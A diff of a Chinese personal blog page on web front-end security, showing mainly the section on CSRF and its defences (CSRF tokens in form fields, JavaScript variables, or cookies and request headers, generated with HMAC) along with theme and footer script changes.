 <h3 id="跨站请求伪造-CSRF"><a href="#跨站请求伪造-CSRF" class="headerlink" title="跨站请求伪造-CSRF"></a>跨站请求伪造-CSRF</h3><p>Cross-Site Request Forgery Forgery,普通用户在正常源站点登录后，在另外的中转站点执行了对源站点的请求(由恶意用户构造)，该请求利用源站点普通用户已有的登录态，来执行恶意用户的操作。</p>
-<h4 id="CSRF攻击防御"><a href="#CSRF攻击防御" class="headerlink" title="CSRF攻击防御"></a>CSRF攻击防御</h4><p>CSRF攻击防御–&gt;服务端生成CSRF Token–&gt;<br>1.Html 节点，如表单、标签属性等<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"csrfToken"</span> <span class="attr">value</span>=<span class="string">"NjsdNJsaY"</span></span></div></pre></td></tr></table></figure></p>
-<p>2.Javascript变量<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">window</span>.csrfToken=<span class="string">'sdsajGAau'</span></div></pre></td></tr></table></figure></p>
-<p>3.http响应时写cookie+Ajax 请求时加头<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//响应内容,CSRF Token写到Cookie</div><div class="line">set-cookie:Csrf-token=KsjaTysj.Path=/</div><div class="line">//请求内容,从Cookie读取CSRF Token，并添加到请求头服务端进行校验</div><div class="line">X-Requested-With:XMLHttpRequest</div><div class="line">X-Csrf-Token:KsjaTysj</div></pre></td></tr></table></figure></p>
+<h4 id="CSRF攻击防御"><a href="#CSRF攻击防御" class="headerlink" title="CSRF攻击防御"></a>CSRF攻击防御</h4><p>CSRF攻击防御–&gt;服务端生成CSRF Token–&gt;<br>1.Html 节点，如表单、标签属性等<br><figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"csrfToken"</span> <span class="attr">value</span>=<span class="string">"NjsdNJsaY"</span></span></div></pre></td></tr></table></figure></p>
+<p>2.Javascript变量<br><figure class="highlight js"><table><tr><td class="code"><pre><div class="line"><span class="built_in">window</span>.csrfToken=<span class="string">'sdsajGAau'</span></div></pre></td></tr></table></figure></p>
+<p>3.http响应时写cookie+Ajax 请求时加头<br><figure class="highlight"><table><tr><td class="code"><pre><div class="line">//响应内容,CSRF Token写到Cookie</div><div class="line">set-cookie:Csrf-token=KsjaTysj.Path=/</div><div class="line">//请求内容,从Cookie读取CSRF Token，并添加到请求头服务端进行校验</div><div class="line">X-Requested-With:XMLHttpRequest</div><div class="line">X-Csrf-Token:KsjaTysj</div></pre></td></tr></table></figure></p>
 <p>csrf token生成：</p>
 <ul>
 <li><p>用密钥哈希算法：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> csrfToken = HMAC(sessionToken,key)</div></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> csrfToken = HMAC(sessionToken,key)</div></pre></td></tr></table></figure>
 </li>
 <li><p>开源项目：Anti-csrf、csrf</p>
 </li>
@@ -259,107 +335,239 @@
 <li>文件头校验（针对上传文件，比如文件头前N个字节检查）</li>
 </ul>
 
-  </div>
+                <hr>
+                
+
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2017/07/16/学习相关Nginx配置/" data-toggle="tooltip" data-placement="top"
+                           title="学习Nginx相关配置">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/2017/06/16/基于react的视频类APP分享页填坑总结/" data-toggle="tooltip" data-placement="top"
+                           title="基于react的视频类APP分享页填坑总结">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                
+
+                
+
+
+                <!--加入新的评论系统-->
+                
+            </div>
+
+            <div class="hidden-xs col-sm-3 toc-col">
+                <div class="toc-wrap">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#常见的web攻击原理与防御"><span class="toc-text">常见的web攻击原理与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#跨域与同源策略"><span class="toc-text">跨域与同源策略</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#postMesage"><span class="toc-text">postMesage</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Access-Control-Allow-Origin"><span class="toc-text">Access-Control-Allow-Origin</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#跨站脚本攻击-XSS"><span class="toc-text">跨站脚本攻击-XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#危害："><span class="toc-text">危害：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS的分类与原理"><span class="toc-text">XSS的分类与原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#示例"><span class="toc-text">示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS构造"><span class="toc-text">XSS构造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS的防御"><span class="toc-text">XSS的防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#跨站请求伪造-CSRF"><span class="toc-text">跨站请求伪造-CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CSRF攻击防御"><span class="toc-text">CSRF攻击防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入攻击"><span class="toc-text">SQL注入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL注入的危害"><span class="toc-text">SQL注入的危害</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL注入攻击防御"><span class="toc-text">SQL注入攻击防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网络劫持"><span class="toc-text">网络劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#网络劫持防御"><span class="toc-text">网络劫持防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NodeJS的安全问题"><span class="toc-text">NodeJS的安全问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#开发中安全意识"><span class="toc-text">开发中安全意识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#安全意识："><span class="toc-text">安全意识：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#请求数据校验"><span class="toc-text">请求数据校验</span></a></li></ol></li></ol></li></ol>
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5 class="text-center">
+                        <a href="/tags/">FEATURED TAGS</a>
+                    </h5>
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/#web安全"
+                           title="web安全">web安全</a>
+                        
+                        <a class="tag" href="/tags/#跨域"
+                           title="跨域">跨域</a>
+                        
+                        <a class="tag" href="/tags/#HTTP劫持"
+                           title="HTTP劫持">HTTP劫持</a>
+                        
+                        <a class="tag" href="/tags/#XSS"
+                           title="XSS">XSS</a>
+                        
+                        <a class="tag" href="/tags/#CSRF"
+                           title="CSRF">CSRF</a>
+                        
+                        <a class="tag" href="/tags/#nodejs"
+                           title="nodejs">nodejs</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+        </div>
+
+    </div>
 </article>
 
 
 
+
+
+
+
+<!-- Footer -->
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <br>
+                <ul class="list-inline text-center">
+                
+                
+                
+                    <li>
+                        <a target="_blank" href="https://www.zhihu.com/people/perkin">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa  fa-stack-1x fa-inverse">知</i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+                    <li>
+                        <a target="_blank" href="http://weibo.com/2432428362">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/perkinJ">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Perkin 2017
+                </p>
+
+            </div>
+        </div>
     </div>
-    
-      <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">主页</a></li>
-         
-          <li><a href="/archives/">杂谈</a></li>
-         
-          <li><a href="http://github.com/perkinj">项目</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-        
-      </ul>
-    </div>
-
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#常见的web攻击原理与防御"><span class="toc-number">1.</span> <span class="toc-text">常见的web攻击原理与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#跨域与同源策略"><span class="toc-number">1.1.</span> <span class="toc-text">跨域与同源策略</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#postMesage"><span class="toc-number">1.1.1.</span> <span class="toc-text">postMesage</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Access-Control-Allow-Origin"><span class="toc-number">1.1.2.</span> <span class="toc-text">Access-Control-Allow-Origin</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#跨站脚本攻击-XSS"><span class="toc-number">1.2.</span> <span class="toc-text">跨站脚本攻击-XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#危害："><span class="toc-number">1.2.1.</span> <span class="toc-text">危害：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS的分类与原理"><span class="toc-number">1.2.2.</span> <span class="toc-text">XSS的分类与原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#示例"><span class="toc-number">1.2.3.</span> <span class="toc-text">示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS构造"><span class="toc-number">1.2.4.</span> <span class="toc-text">XSS构造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS的防御"><span class="toc-number">1.2.5.</span> <span class="toc-text">XSS的防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#跨站请求伪造-CSRF"><span class="toc-number">1.3.</span> <span class="toc-text">跨站请求伪造-CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CSRF攻击防御"><span class="toc-number">1.3.1.</span> <span class="toc-text">CSRF攻击防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入攻击"><span class="toc-number">1.4.</span> <span class="toc-text">SQL注入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL注入的危害"><span class="toc-number">1.4.1.</span> <span class="toc-text">SQL注入的危害</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL注入攻击防御"><span class="toc-number">1.4.2.</span> <span class="toc-text">SQL注入攻击防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网络劫持"><span class="toc-number">1.5.</span> <span class="toc-text">网络劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#网络劫持防御"><span class="toc-number">1.5.1.</span> <span class="toc-text">网络劫持防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NodeJS的安全问题"><span class="toc-number">1.6.</span> <span class="toc-text">NodeJS的安全问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#开发中安全意识"><span class="toc-number">2.</span> <span class="toc-text">开发中安全意识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#安全意识："><span class="toc-number">2.1.</span> <span class="toc-text">安全意识：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#请求数据校验"><span class="toc-number">2.1.1.</span> <span class="toc-text">请求数据校验</span></a></li></ol></li></ol></li></ol>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://perkinj.github.io/2017/06/16/webSecurity/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://perkinj.github.io/2017/06/16/webSecurity/&text=Web前端安全"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://perkinj.github.io/2017/06/16/webSecurity/&title=Web前端安全"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://perkinj.github.io/2017/06/16/webSecurity/&is_video=false&description=Web前端安全"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Web前端安全&body=Check out this article: http://perkinj.github.io/2017/06/16/webSecurity/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://perkinj.github.io/2017/06/16/webSecurity/&title=Web前端安全"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://perkinj.github.io/2017/06/16/webSecurity/&title=Web前端安全"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://perkinj.github.io/2017/06/16/webSecurity/&title=Web前端安全"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://perkinj.github.io/2017/06/16/webSecurity/&title=Web前端安全"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://perkinj.github.io/2017/06/16/webSecurity/&name=Web前端安全&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-      <ul>
-        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
-        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
-        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
-        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
-      </ul>
-    </div>
-
-  </div>
-</div>
-
-    
-    <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy; 2017 Perkin
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-          <li><a href="/">主页</a></li>
-         
-          <li><a href="/archives/">杂谈</a></li>
-         
-          <li><a href="http://github.com/perkinj">项目</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-        
-      </ul>
-    </nav>
-  </div>
 </footer>
 
-</body>
-</html>
-<!-- styles -->
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
-<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
-<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
 
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
 
-<!-- jquery -->
-<script src="/lib/jquery/jquery.min.js"></script>
-<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
-<script src="/js/main.js"></script>
+<!-- Custom Theme JavaScript -->
+<script src="/js/blog.js"></script>
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://perkinj.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
 <!-- Google Analytics -->
 
-    <script type="text/javascript">
-        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
-        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
-        ga('create', 'UA-100907186-1', 'auto');
-        ga('send', 'pageview');
-    </script>
 
-<!-- Disqus Comments -->
+<script>
+    // dynamic User by Hux
+    var _gaId = 'UA-100907186-1';
+    var _gaDomain = 'perkinzone.cn';
+    // Originial
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    ga('create', _gaId, _gaDomain);
+    ga('send', 'pageview');
+</script>
 
 
+<!-- Baidu Tongji -->
+
+<script>
+    var _baId = '46a74aa9d004724d9ee85ecffa1972f5';
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+        var hm = document.createElement("script");
+        hm.src = "//hm.baidu.com/hm.js?" + _baId;
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- swiftype -->
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','null','2.0.0');
+</script>
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<!--wechat title img-->
+<img class="wechat-title-img" src="http://oum6ifofe.bkt.clouddn.com/image/about.jpg">
+</body>
+
+</html>
